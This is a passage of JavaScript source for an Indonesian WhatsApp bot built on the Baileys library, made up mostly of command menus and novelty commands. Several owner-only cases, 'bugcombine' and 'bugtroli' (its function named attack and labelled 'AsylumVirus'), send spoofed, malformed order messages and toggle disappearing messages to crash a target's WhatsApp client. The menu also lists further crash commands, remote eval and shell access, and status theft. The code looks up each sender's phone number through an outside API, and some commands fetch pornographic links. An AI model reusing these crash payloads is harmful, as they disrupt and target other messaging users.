©DidinSec〆⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'ʙʏ ᴅɪᴅɪɴ️' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break  
case 'ᴏᴛʜᴇʀᴍᴇɴᴜ':
case 'ᴏᴛʜᴇʀᴍᴇɴᴜ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ᴏᴛʜᴇʀ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}ping
*〆⁩*${prefix}inspect
*〆⁩*${prefix}join
*〆⁩*${prefix}dadu
*〆⁩*${prefix}bilangangka number
*〆⁩*${prefix}kalkulator
*〆⁩*${prefix}pantun
*〆⁩*${prefix}quote
*〆⁩*${prefix}nuliskanan teks
*〆⁩*${prefix}nuliskiri teks
*〆⁩*${prefix}foliokiri teks
*〆⁩*${prefix}foliokanan teks
*〆⁩*${prefix}ss link web
*〆⁩*${prefix}liriklagu <query>
*〆⁩*${prefix}artinama <name>
*〆⁩*${prefix}debug
*〆⁩*${prefix}loli 
*〆⁩*${prefix}debug2
*〆⁩*${prefix}infogempa
*〆⁩*${prefix}resepmasakan
*〆⁩*${prefix}chat 62|P
*〆⁩*${prefix}caripesan <query>
*〆⁩*${prefix}get url
*〆⁩*${prefix}githubstalk <query>
*〆⁩*${prefix}ytsearch <query>
*〆⁩*${prefix}igstalk <query>
*〆⁩*${prefix}tiktokstalk <query>
*〆⁩*${prefix}play <query>
*〆⁩*${prefix}video <query>
*〆⁩*${prefix}igstory <username>
*〆⁩*${prefix}twitter <link>
*〆⁩*${prefix}tiktok <link>
*〆⁩*${prefix}fb <link>
*〆⁩*${prefix}brainly <query>
*〆⁩*${prefix}image <query>
*〆⁩*${prefix}anime <random>
*〆⁩*${prefix}pinterest <query>
*〆⁩*${prefix}komiku <query>
*〆⁩*${prefix}lirik <query>
*〆⁩*${prefix}chara <query>
*〆⁩*${prefix}playstore <query>
*〆⁩*${prefix}otaku <query>

©KIRANA`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'BY KIRANA' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break
case 'ᴍᴀᴋᴇʀᴍᴇɴᴜ':
case 'ᴍᴀᴋᴇʀᴍᴇɴᴜ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ᴍᴀᴋᴇʀ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}sticker
*〆⁩*${prefix}swm <author|packname>
*〆⁩*${prefix}take <author|packname>
*〆⁩*${prefix}attp teks
*〆⁩*${prefix}ttp teks
*〆⁩*${prefix}fancytext teks
*〆⁩*${prefix}emoji
*〆⁩*${prefix}halloween teks
*〆⁩*${prefix}vampire teks
*〆⁩*${prefix}codetxt teks
*〆⁩*${prefix}matrix teks
*〆⁩*${prefix}googletxt teks
*〆⁩*${prefix}spiderman teks
*〆⁩*${prefix}express
*〆⁩*${prefix}maker2d2 teks
*〆⁩*${prefix}maker2d3 teks
*〆⁩*${prefix}maker2d4 teks
*〆⁩*${prefix}maker3d teks
*〆⁩*${prefix}golden teks
*〆⁩*${prefix}flower teks
*〆⁩*${prefix}dance
*〆⁩*${prefix}wooden teks
*〆⁩*${prefix}burn teks
*〆⁩*${prefix}glow teks
*〆⁩*${prefix}summer teks
*〆⁩*${prefix}neon teks
*〆⁩*${prefix}coffeecup2 teks
*〆⁩*${prefix}coffeecup teks
*〆⁩*${prefix}battlefield teks|teks
*〆⁩??*${prefix}googletxt2 teks
*〆⁩*${prefix}transformer teks
*〆⁩*${prefix}nulis teks
*〆⁩*${prefix}text3d teks
*〆⁩*${prefix}warrior teks

©KIRANA⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'BY KIRANA' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break                                              
case 'ɢᴀᴍᴇᴍᴇɴᴜ':
case 'ɢᴀᴍᴇᴍᴇɴᴜ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ɢᴀᴍᴇ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}tembak udara
*〆⁩*${prefix}tembak darat
*〆⁩*${prefix}tembak laut
*〆⁩*${prefix}tebakgambar
*〆⁩*${prefix}suit batu/gunting/kertas
*〆⁩*${prefix}slot
*〆⁩*${prefix}dadu
*〆⁩*${prefix}truth
*〆⁩*${prefix}dare

©KIRANA⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'BY KIRANA' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break               
case 'mintareadmore':
reply(`${readmore}`)
break
case 'setmenu':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if(args[0] == 'slow'){
menuslow = true
reply('Sukses')
}else if(args[0] == 'fast'){
menuslow = false
reply('Sukses')
}else if (!c) {
anu =`Silahkan pilih salah satu di bawah`
 buttons = [{buttonId: 'setmenu slow', buttonText: {displayText: 'Slow🐌'}, type: 1},{buttonId: 'setmenu fast', buttonText: {displayText: 'Fast⚡'}, type: 1}]
const skuygelud = {
    contentText: `${anu}`,
    footerText: `*_©${namaowner}_*`,
    buttons: buttons,
    headerType: 1
}
await ronove.sendMessage(from, skuygelud, MessageType.buttonsMessage, {quoted: fdoc})
}
break
case 'ᴀʟʟᴍᴇɴᴜ': 
ptod = "6285347683869@s.whatsapp.net"
stod = `${sender}`
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
       nama = 'ALLMENU'
       ownerJid = "6285347683869@s.whatsapp.net"
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
menunya = `ッ『 Downloader Menu 』ッ
*〆⁩*${prefix}ytmp4
*〆⁩*${prefix}ytmp3
*〆⁩*${prefix}play query
*〆⁩*${prefix}instagram </url>
*〆⁩*${prefix}twitter </url>
                                                      
ッ『 Nsfw Menu 』ッ
〆⁩‼️aktifkan fitur ini dengan ${prefix}nfsw 1
*〆⁩*${prefix}yuri
*〆⁩*${prefix}hentai
*〆⁩*${prefix}anal
*〆⁩*${prefix}lesbian
*〆⁩*${prefix}eroneko
*〆⁩*${prefix}bj
*〆⁩*${prefix}kitsune
*〆⁩*${prefix}pussy
*〆⁩*${prefix}wallpaper
*〆⁩*${prefix}neko2
*〆⁩*${prefix}baka
*〆⁩*${prefix}slap
*〆⁩*${prefix}poke
*〆⁩*${prefix}keta
*〆⁩*${prefix}awoo
*〆⁩*${prefix}blowjob
*〆⁩*${prefix}megumin
*〆⁩*${prefix}neko
*〆⁩*${prefix}trapnime
*〆⁩*${prefix}ass
*〆⁩*${prefix}femdom
*〆⁩*${prefix}hentaigif
*〆⁩*${prefix}yuri
*〆⁩*${prefix}ahegao
*〆⁩*${prefix}cum
*〆⁩*${prefix}masturbation
*〆⁩*${prefix}jahy
*〆⁩*${prefix}orgy
*〆⁩*${prefix}thigs
*〆⁩*${prefix}panties
*〆⁩*${prefix}foot
*〆⁩*${prefix}gangbang
*〆⁩*${prefix}bdsm
*〆⁩*${prefix}ero
*〆⁩*${prefix}glasses

ッ『 Gacha cecan 』ッ
*〆⁩*${prefix}vietnam
*〆⁩*${prefix}korea
*〆⁩*${prefix}china
*〆⁩*${prefix}indonesia
*〆⁩*${prefix}malaysia
*〆⁩*${prefix}japan
*〆⁩*${prefix}thailand                                                                     

ッ『 Grup Menu 』ッ
*〆⁩*${prefix}grup [3 Button]
*〆⁩*${prefix}promote </reply chat member>
*〆⁩*${prefix}demote </reply chat member>
*〆⁩*${prefix}setdesc
*〆⁩*${prefix}nsfw 1/0
*〆⁩*${prefix}setname
*〆⁩*${prefix}kick </reply>
*〆⁩*${prefix}add </reply>
*〆⁩*${prefix}getbio </reply chat member>
*〆⁩*${prefix}getname </reply chat member>
*〆⁩*${prefix}reminder </msg/2s>
*〆⁩*${prefix}listonline
*〆⁩*${prefix}sider [reply chat bot]
*〆⁩*${prefix}antilink
*〆⁩*${prefix}tod 
*〆⁩*${prefix}tospam jumlah
*〆⁩*${prefix}antihidetag
*〆⁩*${prefix}antiviewonce
*〆⁩*${prefix}autojoin
*〆⁩*${prefix}antivirtex
*〆⁩*${prefix}kickarea 
                                                    
ッ『 Stiker Menu 』ッ
*〆⁩*${prefix}toimg
*〆⁩*${prefix}stiker
*〆⁩*${prefix}swm
*〆⁩*${prefix}take
*〆⁩*${prefix}sgif  
                                                            
ッ『 Owner Menu 』ッ
*〆⁩*${prefix}off
*〆⁩*${prefix}isbaileys
*〆⁩*${prefix}banchat
*〆⁩*${prefix}unbanchat
*〆⁩*${prefix}listbc
*〆⁩*${prefix}antidelete on|off
*〆⁩*${prefix}autoketik on| off
*〆⁩*${prefix}autoread gc on / gc off
*〆⁩*${prefix}autovn on / off
*〆⁩*${prefix}antical on | off
*〆⁩*${prefix}getcaption
*〆⁩*${prefix}bugkatalog
*〆⁩*${prefix}buggc [id grup]
*〆⁩*${prefix}okvirtex
*〆⁩*${prefix}on
*〆⁩*${prefix}status
*〆⁩*${prefix}setthumb
*〆⁩*${prefix}settarget
*〆⁩*${prefix}setfakeimg
*〆⁩*${prefix}setreply
*〆⁩*${prefix}hacked
*〆⁩*${prefix}setprefix
*〆⁩*${prefix}mode [2 Button self/public]
*〆⁩*${prefix}term </code>
*〆⁩*${prefix}eval </code>
*〆⁩*${prefix}colongsw [reply sw]
                                          
ッ『 Upsw Menu 』ッ
*〆⁩*${prefix}upswteks teks
*〆⁩*${prefix}upswvideo
*〆⁩*${prefix}upswimage
*〆⁩*${prefix}upswvoice
*〆⁩*${prefix}upswsticker
*〆⁩*${prefix}upswlokasi
                                                      
ッ『 Other Menu 』ッ
*〆⁩*${prefix}ping
*〆⁩*${prefix}inspect
*〆⁩*${prefix}join
*〆⁩*${prefix}dadu
*〆⁩*${prefix}bilangangka number
*〆⁩*${prefix}kalkulator
*〆⁩*${prefix}pantun
*〆⁩*${prefix}quote
*〆⁩*${prefix}nuliskanan teks
*〆⁩*${prefix}nuliskiri teks
*〆⁩*${prefix}foliokiri teks
*〆⁩*${prefix}foliokanan teks
*〆⁩*${prefix}ss link web
*〆⁩*${prefix}liriklagu </query>
*〆⁩*${prefix}artinama </name>
*〆⁩*${prefix}debug
*〆⁩*${prefix}loli 
*〆⁩*${prefix}debug2
*〆⁩*${prefix}infogempa
*〆⁩*${prefix}resepmasakan
*〆⁩*${prefix}chat 62|P
*〆⁩*${prefix}caripesan </query>
*〆⁩*${prefix}get url
*〆⁩*${prefix}githubstalk </query>
*〆⁩*${prefix}ytsearch </query>
*〆⁩*${prefix}igstalk </query>
*〆⁩*${prefix}tiktokstalk </query>
*〆⁩*${prefix}play </query>
*〆⁩*${prefix}video </query>
*〆⁩*${prefix}igstory </username>
*〆⁩*${prefix}twitter </link>
*〆⁩*${prefix}tiktok </link>
*〆⁩*${prefix}fb </link>
*〆⁩*${prefix}brainly </query>
*〆⁩*${prefix}image </query>
*〆⁩*${prefix}anime </random>
*〆⁩*${prefix}pinterest </query>
*〆⁩*${prefix}komiku </query>
*〆⁩*${prefix}lirik </query>
*〆⁩*${prefix}chara </query>
*〆⁩*${prefix}playstore </query>
*〆⁩*${prefix}otaku </query>          
                   
ッ『 Maker Menu 』ッ
*〆⁩*${prefix}sticker
*〆⁩*${prefix}swm </author|packname>
*〆⁩*${prefix}take </author|packname>
*〆⁩*${prefix}attp teks
*〆⁩*${prefix}fancytext teks
*〆⁩*${prefix}emoji
*〆⁩*${prefix}halloween teks
*〆⁩*${prefix}vampire teks
*〆⁩*${prefix}codetxt teks
*〆⁩*${prefix}matrix teks
*〆⁩*${prefix}googletxt teks
*〆⁩*${prefix}spiderman teks
*〆⁩*${prefix}express
*〆⁩*${prefix}maker2d2 teks
*〆⁩*${prefix}maker2d3 teks
*〆⁩*${prefix}maker2d4 teks
*〆⁩*${prefix}maker3d teks
*〆⁩*${prefix}golden teks
*〆⁩*${prefix}flower teks
*〆⁩*${prefix}dance
*〆⁩*${prefix}wooden teks
*〆⁩*${prefix}burn teks
*〆⁩*${prefix}glow teks
*〆⁩*${prefix}summer teks
*〆⁩*${prefix}neon teks
*〆⁩*${prefix}coffeecup2 teks
*〆⁩*${prefix}coffeecup teks
*〆⁩*${prefix}battlefield teks|teks
*〆⁩??*${prefix}googletxt2 teks
*〆⁩*${prefix}transformer teks
*〆⁩*${prefix}nulis teks
*〆⁩*${prefix}text3d teks
*〆⁩*${prefix}warrior teks

ッ『 Game Menu 』ッ
*〆⁩*${prefix}tembak udara
*〆⁩*${prefix}tembak darat
*〆⁩*${prefix}tembak laut
*〆⁩*${prefix}tebakgambar
*〆⁩*${prefix}suit batu/gunting/kertas
*〆⁩*${prefix}slot
*〆⁩*${prefix}dadu
*〆⁩*${prefix}truth
*〆⁩*${prefix}dare

ッ『 Wibu Menu 』ッ

*〆⁩*${prefix}kurumi
*〆⁩*${prefix}deku
*〆⁩*${prefix}sao
*〆⁩*${prefix}chika
*〆⁩*${prefix}kurumi
*〆⁩*${prefix}kaneki
*〆⁩*${prefix}touka
*〆⁩*${prefix}eren
*〆⁩*${prefix}naruto
*〆⁩*${prefix}minato
*〆⁩*${prefix}sagiri
*〆⁩*${prefix}sasuke
*〆⁩*${prefix}sakura
*〆⁩*${prefix}tsunade
*〆⁩*${prefix}gojosatoru
`
   //Masih langka
function _0x21f8() {
    var _0x5b970c = ['5573144JYwLrC', '528103swWGih', 'image/jpeg', 'HZ7GZtD+MZleBjG1flbeTuZkDThPV6frfERXi4zTBvs=', 'readFileSync', '69880vdqygB', '431675fOwedq', '3264wpwOzQ', '3ucdrq0UyCuNG5YcUD9aKX4qkuvcip+OonjhACusy5Q=', '988644bxSaXV', '19894ILewVQ', '2QmpxNq', '66214', '9999999', '1341KlrShJ', '2506689kwMmco', './ronove.jpg'];
    _0x21f8 = function () {
        return _0x5b970c;
    };
    return _0x21f8();
}

function _0x4cac(_0x23a824, _0x283a6f) {
    var _0x21f8ef = _0x21f8();
    return _0x4cac = function (_0x4cacde, _0x3311de) {
        _0x4cacde = _0x4cacde - 0xc7;
        var _0x13ea77 = _0x21f8ef[_0x4cacde];
        return _0x13ea77;
    }, _0x4cac(_0x23a824, _0x283a6f);
}
var _0xcdc6be = _0x4cac;
(function (_0x130db2, _0x4b9859) {
    var _0x3cd68e = _0x4cac,
        _0x5ee5d3 = _0x130db2();
    while (!![]) {
        try {
            var _0x2ac92a = -parseInt(_0x3cd68e(0xce)) / 0x1 * (-parseInt(_0x3cd68e(0xc7)) / 0x2) + parseInt(_0x3cd68e(0xcb)) / 0x3 + -parseInt(_0x3cd68e(0xd6)) / 0x4 + -parseInt(_0x3cd68e(0xd3)) / 0x5 + parseInt(_0x3cd68e(0xd4)) / 0x6 * (parseInt(_0x3cd68e(0xd7)) / 0x7) + -parseInt(_0x3cd68e(0xcd)) / 0x8 + parseInt(_0x3cd68e(0xca)) / 0x9 * (-parseInt(_0x3cd68e(0xd2)) / 0xa);
            if (_0x2ac92a === _0x4b9859) break;
            else _0x5ee5d3['push'](_0x5ee5d3['shift']());
        } catch (_0x5691cb) {
            _0x5ee5d3['push'](_0x5ee5d3['shift']());
        }
    }
}(_0x21f8, 0xccadb), anu = ronove['prepareMessageFromContent'](from, {
    'productMessage': {
        'product': {
            'productImage': {
                'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',
                'mimetype': 'image/jpeg',
                'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'fileLength': 28777,
                'height': 1080,
                'width': 1079,
                'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',
                'fileEncSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'jpegThumbnail': iye
            },
            'productId': _0xcdc6be(0xc9),
            'title': '' + nama,
            'description': '' + menunya,
            'productImageCount': 1
        },
        'businessOwnerJid': "0@s.whatsapp.net",
        'contextInfo': {
            'forwardingScore': 558,
            'isForwarded': !![]
        }
    }
}, {
    'quoted': fdoc,
    'contextInfo': {
        'mentionedJid': [ptod, stod]
    }
}), ronove['relayWAMessage'](anu));
break
       case 'bugcombine':
       

  if (!mek.key.fromMe) return;

 reply(mess.only.ownerB)

                 ronove.toggleDisappearingMessages(from, 'HACKED')

ronove.sendMessage(from, `${namaowner}`, text, {

 quoted: {

  key: {

   participant: '0@s.whatsapp.net' // Fake sender Jid

  },

  message: {

   orderMessage: {

    itemCount: 9999999, // Bug

    status: 1,

    surface: 1,

    message: `${namaowner}`,

    orderTitle: `${namaowner}`, // Idk what this does

    sellerJid: '0@s.whatsapp.net' // Seller

   }

  }

 }

})

setTimeout( () => {

	    ronove.updatePresence(from, Presence.composing)

	    sendMess(`dahlah`)

	    }, 2000)

	    reply(`dahlah`)

break
//setpp by denz
case 'setprofile':
				case 'setpp':
				ronove.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await ronove.downloadAndSaveMediaMessage(enmediau)
					await ronove.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
case 'cekmati':
              if (!q) return reply('namanya sapa?')
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
case 'apakah':
              apakah = body.slice(1)
              const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
              const kah = apa[Math.floor(Math.random() * apa.length)]
              ronove.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: fdoc })
              break
case 'bucinstick':
                case 'bucinsticker':{
         
                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                    var isGif = wifegerakx.endsWith('.gif') ? true : false
                    if (!isGif) {
                    var ngebuff = await getBuffer(wifegerakx)
                    var media = getRandom('.png')
                    fs.writeFileSync(media, ngebuff)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									ronove.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: fdoc})
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    } else {
                     var ngebuff = await getBuffer(wifegerakx)
                 	let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, ngebuff)
					sticWait(from)
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(err)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									ronove.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: fdoc})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    }
                    }
                    break
case 'bokep': case 'bkp': case 'randombokep':{
             if (!isPremium && !isOwner) return sendButMessage (from, prem1, prem2, prem3, { quoted: fdoc})
   if (isGroup && !isNsfw) return reply(`sange? aktifin fitur nsfw dulu dengan cara ${prefix}nsfw 1`)
                fetchJson(`https://pastebin.com/raw/k82VJzeP`).then((data) => {
                    var bokepp = JSON.parse(JSON.stringify(data))
                    var bokep2 =  bokepp[Math.floor(Math.random() * bokepp.length)]
                  ronove.sendMessage(from, bokep2.teks, text, {quoted: fdoc, thumbnail: iye})
                })
                }
                break
case 'bugtroli':
              if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
ronove.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: reply,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
ronove.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'creategroup':
			case 'creategrup':
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = q.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					ronove.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${argz[0]}`)
                }
				break
       case 'gaycek':
       case 'cekgay':
             geii = body.slice(1)
              const gay =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teg = gay[Math.floor(Math.random() * gay.length)]
              ronove.sendMessage(from, '*Pertanyaan :* seberapa geii elu\n*Jawaban :* '+ teg+'%', text, { quoted: mek })
              break
case 'seberapagei':
       case 'seberapagay':
              const gai =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tete = gai[Math.floor(Math.random() * gai.length)]
              fakegroup(`Pertanyaan:${command} ${q}\nJawaban : ${tete}%`)
              break
       case 'jelekcek':
       case 'cekjelek':
              const gyy =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tey = gyy[Math.floor(Math.random() * gyy.length)]
              ronove.sendMessage(from, '*Pertanyaan :* seberapa jelek elu\n*Jawaban :* '+ tey+'%', text, { quoted: mek })
              break
       case 'gantengcek':
       case 'cekganteng':
              ganteng = body.slice(1)
              const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teng = gan[Math.floor(Math.random() * gan.length)]
              ronove.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: mek })
              break
       case 'cantikcek':
       case 'cekcantik':
              cantik = body.slice(1)
              const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tik = can[Math.floor(Math.random() * can.length)]
              ronove.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: mek })
              break
case 'tagall':
              if (!isGroup) return reply(mess.only.group)
              let arr = [];
              let txti = `*╔═══❖•ೋ° °ೋ•❖═══╗*
                      ʙᴇʙᴀɴ ɢʀᴜᴘ
*╚═══❖•ೋ° °ೋ•❖═══╝*${q ? q : ''}\n`
              for (let i of groupMembers){
              txti += `↦ @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
       case 'cekwatak':
              var namao = pushname
              var prfx = await ronove.getProfilePicture(sender)
              const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
              const wtk = watak[Math.floor(Math.random() * (watak.length))]
              const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
              const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
              const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
              const sft = sifat[Math.floor(Math.random() * (sifat.length))]
              const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colkyy','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
              const hby = hobby[Math.floor(Math.random() * (hobby.length))]
              const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
              const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
              const tipecewe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
              const typo = tipe[Math.floor(Math.random() * (tipecewe.length))]
              reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
              break
case 'helpu':
